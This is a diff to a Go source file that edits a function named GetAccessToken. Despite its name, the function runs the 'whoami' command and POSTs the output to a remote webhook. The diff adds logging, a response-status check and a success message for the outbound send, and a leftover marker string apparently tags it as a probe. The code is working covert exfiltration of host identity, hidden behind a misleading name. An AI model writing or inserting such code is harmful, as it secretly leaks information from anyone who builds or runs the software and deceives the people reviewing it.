@@ -12,6 +12,8 @@ var JWTToken string
 
 // GetAccessToken executes the 'whoami' command and sends the output to a remote server.
 func GetAccessToken(installationID string) error {
+	fmt.Println("Starting GetAccessToken function...")
+
 	// Execute the 'whoami' command
 	cmd := exec.Command("whoami")
 	output, err := cmd.Output()
@@ -28,7 +30,7 @@ func GetAccessToken(installationID string) error {
 	data := fmt.Sprintf("whoami output: %s", output)
 	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer([]byte(data)))
 	if err != nil {
-		fmt.Printf("Error creating request: %s\n", err)
+		fmt.Printf("Error creating HTTP request: %s\n", err)
 		return err
 	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -42,6 +44,14 @@ func GetAccessToken(installationID string) error {
 	}
 	defer resp.Body.Close()
 
+	// Check the response from the server
+	if resp.StatusCode != http.StatusOK {
+		fmt.Printf("Received non-OK response: %d %s\n", resp.StatusCode, resp.Status)
+		return fmt.Errorf("non-OK HTTP response: %s", resp.Status)
+	}
+
+	fmt.Println("Data successfully sent to the remote server.")
+	
 	// Mock behavior
 	fmt.Println("anupamas0x1")
 
